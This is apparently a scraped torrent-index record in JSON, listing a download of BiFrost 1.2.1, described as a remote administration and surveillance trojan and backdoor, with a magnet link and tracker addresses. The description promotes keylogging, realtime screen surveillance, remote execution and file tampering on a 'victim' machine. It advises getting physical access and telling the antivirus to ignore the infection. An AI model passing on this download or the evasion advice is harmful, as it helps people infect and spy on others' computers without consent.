{"title":"bifrost121.zip","uid":4134731,"size":604369,"categoryP":"applications","categoryS":"windows","magnet":"?xt=urn:btih:3c31e96fc57aec30478ecbbc80b893aaba35c00d&amp;dn=bifrost121.zip&amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;tr=udp%3A%2F%2Fopen.demonii.com%3A1337&amp;tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;tr=udp%3A%2F%2Fexodus.desync.com%3A6969","seeders":0,"leechers":0,"uploader":"KOJV","files":1,"time":1208207894,"description":"BiFrost is a rare, no longer developed remote administration and surveillance trojan and backdoor software that will allow you to, said you can run an executable on the target machine or make it&amp;#039;s user run an exe, see all files and registry key, edit them, delete or upload new ones, get a screenshot or a realtime screen surveillance, see a keylog or view keystrokes in realtime, and much more.\n\nPassword protection to make sure nobody but yourself can control the target machine.\n\nBeware - you are easily traced back by ip in case anyone fluent with computer security is taking the victim user&amp;#039;s place. This way, charges may be filed against you for digital trespassing.\n\nAlso note that both the client program and the host infesters it builds are detected by any decent antivirus. So, unless the victim doesn&amp;#039;t have an antivirus, you must gain physical access first to infect it and tell the antivirus to ignore the infection.\n\nBiFrost may also be use for legitimate purposes, such as remote administration of machines which users are aware of BiFrost, or, building the host with a different setting, to use for legitimate remote assistance.","torrent":{"xt":"urn:btih:3c31e96fc57aec30478ecbbc80b893aaba35c00d","amp;dn":"bifrost121.zip","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"3c31e96fc57aec30478ecbbc80b893aaba35c00d","infoHashBuffer":{"type":"Buffer","data":[60,49,233,111,197,122,236,48,71,142,203,188,128,184,147,170,186,53,192,13]},"announce":[],"urlList":[]}}